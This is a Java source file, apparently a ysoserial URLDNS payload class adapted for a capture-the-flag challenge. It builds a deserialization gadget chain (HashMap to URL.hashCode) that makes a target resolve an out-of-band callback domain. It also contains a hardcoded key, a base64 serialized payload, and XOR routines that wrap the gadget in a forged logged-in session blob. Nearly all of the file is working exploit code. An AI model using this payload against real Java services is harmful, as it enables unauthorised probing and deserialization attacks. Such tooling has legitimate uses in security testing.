package ysoserial.payloads;

import com.threedr3am.ctf.base64.Base64Translater;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.Base64;
import java.util.HashMap;
import java.net.URL;

import java.util.UUID;
import org.apache.shiro.crypto.CryptoException;
import org.apache.shiro.crypto.hash.Md5Hash;
import org.apache.shiro.crypto.hash.Sha1Hash;
import org.apache.shiro.util.ByteSource;
import org.json.JSONObject;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 * This was inspired by  Philippe Arteau @h3xstream, who wrote a blog posting describing how he
 * modified the Java Commons Collections gadget in ysoserial to open a URL. This takes the same
 * idea, but eliminates the dependency on Commons Collections and does a DNS lookup with just
 * standard JDK classes.
 *
 * The Java URL class has an interesting property on its equals and hashCode methods. The URL class
 * will, as a side effect, do a DNS lookup during a comparison (either equals or hashCode).
 *
 * As part of deserialization, HashMap calls hashCode on each key that it deserializes, so using a
 * Java URL object as a serialized key allows it to trigger a DNS lookup.
 *
 * Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode()
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(skip = "true")
@Dependencies()
@Authors({Authors.GEBL})
public class URLDNS implements ObjectPayload<Object> {

    public Object getObject(final String url) throws Exception {

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u,
            url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(u, "hashCode",
            -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

        return ht;
    }

    public static void main(final String[] args1) throws Exception {
        String[] args = new String[]{"http://jsp.yqzf33.ceye.io"};
        PayloadRunner.runDeserialize = false;
        PayloadRunner.run(URLDNS.class, args);

        String key = "wR&_(NVG#c&9(CDhaDMZELDmxSe(mwbB";
        key = new Md5Hash(key).toString();
        String b64SerializeData = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEmpzcC55cXpmMzMuY2V5ZS5pb3QAAHEAfgAFdAAEaHR0cHB4dAAZaHR0cDovL2pzcC55cXpmMzMuY2V5ZS5pb3g=";
        ByteSource byteSource1 = encrypt(Base64.getDecoder().decode(b64SerializeData),
            key.getBytes());
        System.out.println(byteSource1.toBase64());
    }


    public static ByteSource decrypt(byte[] ciphertext, byte[] key)
        throws CryptoException {
        String skey = new Sha1Hash(new String(key)).toString();
        byte[] bkey = skey.getBytes();
        byte[] data_bytes = new byte[ciphertext.length];
        for (int i = 0; i < ciphertext.length; i++) {
            data_bytes[i] = ((byte) (ciphertext[i] ^ bkey[(i % bkey.length)]));
        }
        byte[] jsonData = new byte[ciphertext.length / 2];
        for (int i = 0; i < jsonData.length; i++) {
            jsonData[i] = ((byte) (data_bytes[(i * 2)] ^ data_bytes[(i * 2 + 1)]));
        }
        System.out.println(new String(jsonData));
        JSONObject jsonObject = new JSONObject(new String(jsonData));
        String serial = (String) jsonObject.get("serialize_data");
        return ByteSource.Util.bytes(Base64.getDecoder().decode(serial));
    }

    public static ByteSource encrypt(byte[] plaintext, byte[] key)
        throws CryptoException {
        String sign = new Md5Hash(UUID.randomUUID().toString()).toString() + "asfda-92u134-";
        String user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36";
        String ip_address = "10.10.18.210";
        String data =
            "{\"user_is_login\":\"1\",\"sign\":\"" + sign + "\",\"ip_address\":\"" + ip_address
                + "\",\"user_agent\":\"" + user_agent + "\",\"serialize_data\":\"" + Base64
                .getEncoder()
                .encodeToString(plaintext) + "\"}";
        byte[] data_bytes = data.getBytes();
        byte[] okey = new Sha1Hash(new String(key)).toString().getBytes();
        byte[] mkey = new Sha1Hash(UUID.randomUUID().toString()).toString().getBytes();
        byte[] out = new byte[2 * data_bytes.length];
        for (int i = 0; i < data_bytes.length; i++) {
            out[(i * 2)] = mkey[(i % mkey.length)];
            out[(i * 2 + 1)] = ((byte) (mkey[(i % mkey.length)] ^ data_bytes[i]));
        }
        byte[] result = new byte[out.length];
        for (int i = 0; i < out.length; i++) {
            result[i] = ((byte) (out[i] ^ okey[(i % okey.length)]));
        }
        return ByteSource.Util.bytes(result);
    }


    /**
     * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL
     * instance.
     * DNS resolution is used for vulnerability detection. It is important not to probe the given URL
     * prior using the serialized object.</p>
     *
     * <b>Potential false negative:</b>
     * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a
     * cache hit on the
     * second resolution.</p>
     */
    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
